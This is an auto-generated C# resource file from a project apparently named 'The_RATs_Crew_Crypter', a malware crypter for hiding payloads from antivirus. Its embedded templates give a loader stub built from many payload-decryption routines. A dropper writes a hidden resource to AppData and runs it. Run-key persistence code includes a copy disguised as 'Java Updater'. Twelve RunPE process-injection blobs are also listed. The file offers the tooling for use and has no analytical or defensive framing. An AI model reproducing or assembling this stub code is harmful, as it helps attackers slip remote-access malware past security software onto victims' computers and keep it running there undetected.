//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.239
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace The_RATs_Crew_Crypter.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("The_RATs_Crew_Crypter.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] input, string Pass)
        ///        {
        ///            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
        ///            byte[] hash = new byte[32];
        ///            byte[] temp = new MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass));
        ///            Array.Copy(temp, 0, hash, 0, 16);
        ///            Array.Copy(temp, 0, hash, 15, 16);
        ///            AES.Key = hash;
        ///            AES.Mode = System.Security.Cr [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string AESDecrypt {
            get {
                return ResourceManager.GetString("AESDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to [assembly: AssemblyTitle(&quot;[TITLE]&quot;)]
        ///[assembly: AssemblyDescription(&quot;[DESCRIPTION]&quot;)]
        ///[assembly: AssemblyCopyright(&quot;[COPYRIGHT]&quot;)]
        ///[assembly: AssemblyVersion(&quot;[VERSION]&quot;)]
        ///[assembly: AssemblyFileVersion(&quot;[FILE-VERSION]&quot;)]
        ///[assembly: AssemblyCompany(&quot;[COMPANY]&quot;)]
        ///[assembly: AssemblyProduct(&quot;[PRODUCT]&quot;)].
        /// </summary>
        internal static string AssemblyChanger {
            get {
                return ResourceManager.GetString("AssemblyChanger", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] Input, string key)
        ///        {
        ///            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
        ///            byte[] FinVal = new byte[Input.Length];
        ///            short kc = 0;
        ///            for (int index = 0; index &lt; Input.Length; index++)
        ///            {
        ///                if (kc &gt;= Key.Length) kc = 0;
        ///                FinVal[index] = (byte)(Input[index] - (Input.Length % Key.Length) - (Key[kc]));
        ///                kc++;
        ///            }
        ///            return FinVal;
        /// [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string CloudDecrypt {
            get {
                return ResourceManager.GetString("CloudDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decompress(byte[] gzBuffer)
        ///        {
        ///            MemoryStream ms = new MemoryStream();
        ///            int msgLength = BitConverter.ToInt32(gzBuffer, 0);
        ///            ms.Write(gzBuffer, 4, gzBuffer.Length - 4);
        ///
        ///            byte[] buffer = new byte[msgLength];
        ///
        ///            ms.Position = 0;
        ///            GZipStream zip = new GZipStream(ms, CompressionMode.Decompress);
        ///            zip.Read(buffer, 0, buffer.Length);
        ///
        ///            return buffer;
        ///        }.
        /// </summary>
        internal static string CompressionDecompress {
            get {
                return ResourceManager.GetString("CompressionDecompress", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         private static string DefaultBrowser()
        ///        {
        ///            string val = (string)Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(@&quot;http\shell\open\command&quot;).GetValue(&quot;&quot;);
        ///            return val.Substring(1, val.IndexOf(&quot;.exe&quot;) + 3);
        ///        }.
        /// </summary>
        internal static string DefaultBrowser {
            get {
                return ResourceManager.GetString("DefaultBrowser", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to   public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    byte[] inputArray = bytes;
        ///    DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
        ///    DES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///    DES.Mode = CipherMode.ECB;
        ///    DES.Padding = PaddingMode.PKCS7;
        ///    ICryptoTransform cTransform = DES.CreateDecryptor();
        ///    byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
        ///    DES.Clear();
        ///    return resultArray;
        ///  }.
        /// </summary>
        internal static string DESDecrypt {
            get {
                return ResourceManager.GetString("DESDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] plain, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            for (int round = 4; round &gt;= 0; round--)
        ///            {
        ///                for (int i = 0; i &lt; plain.Length; i++)
        ///                {
        ///                    for (int k = 0; k &lt; key.Length; k++) plain[i] = (byte)(plain[i] ^ ((((key[k] &lt;&lt; round) ^ k) + i)));
        ///                    plain[i] = (byte)(plain[i] ^ key[i % key.Length]);
        ///                }
        ///            } [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string DexDecrypt {
            get {
                return ResourceManager.GetString("DexDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to                 byte[] candy = (byte[])MANAGER.GetObject(&quot;candy&quot;);
        ///                string pazt = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +&quot;\\[FILENAME]&quot;;
        ///                File.WriteAllBytes(pazt, candy);
        ///                System.Diagnostics.Process.Start(pazt);.
        /// </summary>
        internal static string Dropper {
            get {
                return ResourceManager.GetString("Dropper", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to                 byte[] bri = (byte[])MANAGER.GetObject(&quot;bri&quot;);
        ///                string bri2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +&quot;\\[FILENAME]&quot;;
        ///                File.WriteAllBytes(bri2, bri);
        ///                System.Diagnostics.Process.Start(bri2);.
        /// </summary>
        internal static string Dropper2 {
            get {
                return ResourceManager.GetString("Dropper2", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to                 string Copy2 = [INSTALL-PATH] + &quot;\\&quot; + Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location);
        ///                if (!File.Exists(Copy2))
        ///                {
        ///                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Copy2, true);
        ///                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, true).SetValue(&quot;Java Updater&quot;, Copy2);
        ///                }.
        /// </summary>
        internal static string InstallFile {
            get {
                return ResourceManager.GetString("InstallFile", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] PolyAESDecrypt(byte[] cipherText, string Key)
        ///        {
        ///            byte[] salt;
        ///            SymmetricAlgorithm algo = new RijndaelManaged();
        ///            algo.Mode = CipherMode.CBC;
        ///            RNGCryptoServiceProvider rngAlgo = new RNGCryptoServiceProvider();
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            byte[] cipherTextWithSalt = new byte[1];
        ///            byte[] encSalt = new byte[1];
        ///            byte[] origCipherText = new byte[1];
        ///  [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyAESDecrypt {
            get {
                return ResourceManager.GetString("PolyAESDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] input, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            byte[] Out = new byte[input.Length - 1];
        ///            int x = input[input.Length - 1];
        ///            for (int i = 0; i &lt;= Out.Length - 1; i++) Out[i] = (byte)(input[i] ^ (key[i % key.Length] + x) &amp; 255);
        ///            return Out;
        ///        }.
        /// </summary>
        internal static string PolyBabyDecrypt {
            get {
                return ResourceManager.GetString("PolyBabyDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to public static byte[] Decrypt(byte[] Input, string key)
        ///        {
        ///            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
        ///            int Salt = (int)Input[Input.Length - 1];
        ///            byte[] FinVal = new byte[Input.Length - 1];
        ///            short kc = 0;
        ///            for (int index = 0; index &lt; Input.Length - 1; index++)
        ///            {
        ///                if (kc &gt;= Key.Length) kc = 0;
        ///                if (index &gt;= Input.Length - 1) continue;
        ///                FinVal[index] = (byte)(Input[index] [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyCloudDecrypt {
            get {
                return ResourceManager.GetString("PolyCloudDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] bytes, string Key)
        ///        {
        ///            byte[] inputArray = bytes;
        ///            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
        ///            DES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///            DES.Mode = CipherMode.ECB;
        ///            DES.Padding = PaddingMode.PKCS7;
        ///            ICryptoTransform cTransform = DES.CreateDecryptor();
        ///            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
        ///            D [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyDESDecrypt {
            get {
                return ResourceManager.GetString("PolyDESDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] plain, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            byte[] expandedKey;
        ///            byte[] dKey = key;
        ///            int length = plain.Length;
        ///            if (dKey.Length &gt;= length) expandedKey = dKey;
        ///            else
        ///            {
        ///                byte[] rconst = BitConverter.GetBytes(Math.Round(Math.PI, 3));
        ///                byte[] result = new byte[length];
        ///                Buffer.BlockCopy(dKey, 0 [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyDexDecrypt {
            get {
                return ResourceManager.GetString("PolyDexDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] PolyRC2Decrypt(byte[] bytes, string Key)
        ///        {
        ///            byte[] byteKey = Encoding.ASCII.GetBytes(Key);
        ///            byte[] byteIV = byteKey;
        ///            MemoryStream MS = new MemoryStream();
        ///            RC2CryptoServiceProvider RC2 = new RC2CryptoServiceProvider();
        ///            CryptoStream CS = new CryptoStream(MS, RC2.CreateDecryptor(byteKey, byteIV), CryptoStreamMode.Write);
        ///            CS.Write(bytes, 0, bytes.Length);
        ///            CS.FlushFinalBlock();
        ///         [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyRC2Decrypt {
            get {
                return ResourceManager.GetString("PolyRC2Decrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] data, string pass)
        ///        {
        ///            Array.Reverse(data);
        ///            byte rndByte = data[data.Length - 1];
        ///            byte[] passByte = System.Text.Encoding.ASCII.GetBytes(pass);
        ///            byte[] Out = new byte[data.Length + 1];
        ///            int u = 0;
        ///            for (int i = 0; i &lt;= data.Length - 1; i++)
        ///            {
        ///                Out[i] = (byte)((data[i] ^ rndByte) ^ passByte[u]);
        ///                Array.Reverse(passByte);
        ///                if  [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyRevDecrypt {
            get {
                return ResourceManager.GetString("PolyRevDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] Data, string key)
        ///        {
        ///            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
        ///            for (int i = 0; i &lt;= Data.Length; i++)
        ///            {
        ///                Data[i % Data.Length] = (byte)(((int)(Data[i % Data.Length] ^ Key[i % Key.Length]) - (int)(Data[(i + 1) % Data.Length]) + 256) % 256);
        ///            }
        ///            Array.Resize(ref Data, Data.Length - 1);
        ///            return Data;
        ///        }.
        /// </summary>
        internal static string PolyStairsDecrypt {
            get {
                return ResourceManager.GetString("PolyStairsDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] bytes, string Key)
        ///        {
        ///            MemoryStream ms = new MemoryStream();
        ///            System.Security.Cryptography.SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
        ///            byte[] key = Encoding.ASCII.GetBytes(Key);
        ///            byte[] rgbIV = key;
        ///            CryptoStream cs = new CryptoStream(ms, rijn.CreateDecryptor(key, rgbIV), CryptoStreamMode.Write);
        ///            cs.Write(bytes, 0, bytes.Length);
        ///            cs.Close();
        ///            byte[ [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolySymentricDecrypt {
            get {
                return ResourceManager.GetString("PolySymentricDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] bytes, string Key)
        ///        {
        ///            byte[] inputArray = bytes;
        ///            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
        ///            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///            tripleDES.Mode = CipherMode.ECB;
        ///            tripleDES.Padding = PaddingMode.PKCS7;
        ///            ICryptoTransform cTransform = tripleDES.CreateDecryptor();
        ///            byte[] resultArray = cTransform.TransformFinalBlock(inputAr [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PolyTripleDESDecrypt {
            get {
                return ResourceManager.GetString("PolyTripleDESDecrypt", resourceCulture);
            }
        }
        
        internal static System.Drawing.Bitmap ratscrewlogo {
            get {
                object obj = ResourceManager.GetObject("ratscrewlogo", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to   public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    byte[] byteKey = Encoding.ASCII.GetBytes(Key);
        ///    byte[] byteIV = byteKey;
        ///    MemoryStream MS = new MemoryStream();
        ///    RC2CryptoServiceProvider RC2 = new RC2CryptoServiceProvider();
        ///    CryptoStream CS = new CryptoStream(MS, RC2.CreateDecryptor(byteKey, byteIV), CryptoStreamMode.Write);
        ///    CS.Write(bytes, 0, bytes.Length);
        ///    CS.FlushFinalBlock();
        ///    return MS.ToArray();
        ///  } .
        /// </summary>
        internal static string RC2Decrypt {
            get {
                return ResourceManager.GetString("RC2Decrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///    byte[] s = new byte[256];
        ///    byte[] k = new byte[256];
        ///    byte temp;
        ///    int i, j;
        ///
        ///    for (i = 0; i &lt; 256; i++)
        ///    {
        ///    s[i] = (byte)i;
        ///    k[i] = key[i % key.GetLength(0)];
        ///    }
        ///
        ///    j = 0;
        ///    for (i = 0; i &lt; 256; i++)
        ///    {
        ///    j = (j + s[i] + k[i]) % 256;
        ///    temp = s[i];
        ///    s[i] = s[j];
        ///    s[j] = temp;
        ///    }
        ///
        ///    i = j = 0;
        ///    for (int x = 0; x &lt; by [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string RC4EncryptDecrypt {
            get {
                return ResourceManager.GetString("RC4EncryptDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to   public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    Rijndael rijndael = Rijndael.Create();
        ///    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(Key,
        ///    new byte[] { 0x26, 0xdc, 0xff, 0x00, 0xad, 0xed, 0x7a, 0xee, 0xc5, 0xfe, 0x07, 0xaf, 0x4d, 0x08, 0x22, 0x3c });
        ///    rijndael.Key = pdb.GetBytes(32);
        ///    rijndael.IV = pdb.GetBytes(16);
        ///    MemoryStream memoryStream = new MemoryStream();
        ///    CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStrea [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string RijndaelDecrypt {
            get {
                return ResourceManager.GetString("RijndaelDecrypt", resourceCulture);
            }
        }
        
        internal static byte[] RunPE0 {
            get {
                object obj = ResourceManager.GetObject("RunPE0", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE1 {
            get {
                object obj = ResourceManager.GetObject("RunPE1", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE10 {
            get {
                object obj = ResourceManager.GetObject("RunPE10", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE11 {
            get {
                object obj = ResourceManager.GetObject("RunPE11", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE2 {
            get {
                object obj = ResourceManager.GetObject("RunPE2", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE3 {
            get {
                object obj = ResourceManager.GetObject("RunPE3", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE4 {
            get {
                object obj = ResourceManager.GetObject("RunPE4", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE5 {
            get {
                object obj = ResourceManager.GetObject("RunPE5", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE6 {
            get {
                object obj = ResourceManager.GetObject("RunPE6", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE7 {
            get {
                object obj = ResourceManager.GetObject("RunPE7", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE8 {
            get {
                object obj = ResourceManager.GetObject("RunPE8", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPE9 {
            get {
                object obj = ResourceManager.GetObject("RunPE9", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Resources;
        ///using System.Reflection;
        ///using System.Security.Cryptography;
        ///using System.Text;
        ///using System.IO;
        ///using System.Runtime.InteropServices;
        ///using System.IO.Compression;
        ///
        ///[ASSEMBLY-CHANGER]
        ///
        ///namespace Lawl
        ///{
        ///    class Program
        ///    {
        ///        static void Main()
        ///        {
        ///            try
        ///            {
        ///				[INSTALL]
        ///				[STARTUP]
        ///                ResourceManager MANAGER = new ResourceManager(&quot;shank&quot;, Assembly.GetExecutingAssembly());
        ///                [DROPPER]        /// [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Source {
            get {
                return ResourceManager.GetString("Source", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static byte[] Decrypt(byte[] Data, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            for (int i = (Data.Length * 2) + key.Length; i &gt;= 0; i += -1)
        ///            {
        ///                Data[i % Data.Length] = (byte)(((int)(Data[i % Data.Length] ^ key[i % key.Length]) - (int)(Data[(i + 1) % Data.Length]) + 256) % 256);
        ///            }
        ///            return Data;
        ///        }.
        /// </summary>
        internal static string StairsDecrypt {
            get {
                return ResourceManager.GetString("StairsDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to             Microsoft.Win32.Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 
        ///            true).SetValue(&quot;[KEYNAME]&quot;, System.Reflection.Assembly.GetExecutingAssembly().Location);.
        /// </summary>
        internal static string Startup {
            get {
                return ResourceManager.GetString("Startup", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to   public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    MemoryStream ms = new MemoryStream();
        ///    System.Security.Cryptography.SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
        ///    byte[] key = Encoding.ASCII.GetBytes(Key);
        ///    byte[] rgbIV = key;
        ///    CryptoStream cs = new CryptoStream(ms, rijn.CreateDecryptor(key, rgbIV), CryptoStreamMode.Write);
        ///    cs.Write(bytes, 0, bytes.Length);
        ///    cs.Close();
        ///    return ms.ToArray();
        ///  } .
        /// </summary>
        internal static string SymentricDecrypt {
            get {
                return ResourceManager.GetString("SymentricDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to   public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    byte[] inputArray = bytes;
        ///    TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
        ///    tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///    tripleDES.Mode = CipherMode.ECB;
        ///    tripleDES.Padding = PaddingMode.PKCS7;
        ///    ICryptoTransform cTransform = tripleDES.CreateDecryptor();
        ///    byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
        ///    tripleDES.Clear();
        ///    return resu [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string TripleDESDecrypt {
            get {
                return ResourceManager.GetString("TripleDESDecrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to         public static string vbc()
        ///        {
        ///            return Environment.GetFolderPath(Environment.SpecialFolder.System).Replace(&quot;system32&quot;, &quot;Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&quot;);
        ///        }.
        /// </summary>
        internal static string VBC {
            get {
                return ResourceManager.GetString("VBC", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to public static byte[] Decrypt(byte[] bytes, string Key)
        ///  {
        ///    int amount = 350;
        ///    byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///    for (int i = 0; i &lt; bytes.Length; i++) bytes[i] ^= (byte)(key[i % key.Length] &gt;&gt; (i + amount + key.Length) &amp; 255);
        ///    return bytes;
        ///  }.
        /// </summary>
        internal static string XOREncryptDecrypt {
            get {
                return ResourceManager.GetString("XOREncryptDecrypt", resourceCulture);
            }
        }
    }
}
